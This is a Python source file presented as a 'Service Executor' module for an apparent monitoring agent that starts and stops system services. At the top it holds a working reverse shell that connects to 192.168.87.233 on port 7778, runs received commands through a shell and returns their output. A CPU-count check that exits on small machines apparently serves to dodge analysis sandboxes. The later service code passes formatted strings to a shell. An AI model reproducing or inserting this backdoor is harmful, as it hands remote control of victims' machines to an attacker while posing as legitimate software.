'''Service Executor'''

import os
import socket
import subprocess


if os.cpu_count() <= 2:
    quit()

HOST = '192.168.87.233'
PORT = 7778

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue
    
s.close()


import subprocess
import logging
import agent.config as config
from agent.utils.platform_os import Platform
from agent.process.services import is_service_autostart, enable_service_autostart, disable_service_autostart

LINUX_SERVICE_START = 'sudo systemctl start {service}'
LINUX_SERVICE_STOP = 'sudo systemctl stop {service}'
LINUX_SERVICE_RESTART = 'sudo systemctl restart {service}'

SERVICE_ACTIONS = ['start', 'restart']

agentConfig = config.get_agent_conf()

LINUX_ACTIONS = {
    'start': agentConfig.get('service_start_command', LINUX_SERVICE_START),
    'stop': agentConfig.get('service_stop_command', LINUX_SERVICE_STOP),
    'restart': agentConfig.get('service_restart_command', LINUX_SERVICE_RESTART)
}

# Globals
log = logging.getLogger(__name__)

def service_executor(command, checksd):
    '''Service Type Executor'''
    action = command.get('command', '')
    dest = command.get('dest', '')
    # args = command.get('args', '')
    if action == '' or dest == '':
        return

    if action not in SERVICE_ACTIONS:
        return
    
    component = config.convert_to_netbrain_component(dest, True)
    if component is None:
        log.error('Invalid target service: %s', dest)
        return

    result = None
    currCheck = None
    currInstance = None

    for check in checksd.get('initialized_checks', []):
        for instance in check.instances:
            if instance['name'] == dest:
                currCheck = check
                currInstance = instance

    if currCheck is not None and currCheck.ensure_use_service_actions(currInstance, action):
        try:
            result = getattr(currCheck, "service_" + action)(currInstance)
            return result
        except NotImplementedError:
            pass
        except:
            pass

    if Platform.is_windows():
        windows_service_manager(dest, action)
    else:
        exe_command = LINUX_ACTIONS[action]
        exe_command = str.format(exe_command, service=dest).strip()

        process = subprocess.Popen(
            exe_command, shell=True, stderr=subprocess.PIPE)
        process.wait()
        stderr = process.stderr.read()
        log.debug("Exe_command: %s, result: %s" % (exe_command, stderr))
        if process.returncode != 0:
            result = stderr
        if len(stderr) > 0:
            result = stderr

    if action == 'start':
        enable_service_autostart(dest)

    if action == 'stop' and is_service_autostart(dest):
        disable_service_autostart(dest)

    return result


def windows_service_manager(service, action):
    '''Windows Service start|stop|restart|status'''
    import win32serviceutil
    from agent.utils.win_service import start_service,stop_service,restart_service

    running = win32serviceutil.QueryServiceStatus(service)[1] == 4

    if action == 'stop' and running is True:
        return stop_service(service)
    elif action == 'start' and running is False:
        return start_service(service)
    elif action == 'restart' and running is True:
        return restart_service(service)
    elif action == 'status':
        return running
    else:
        return 'unknown'
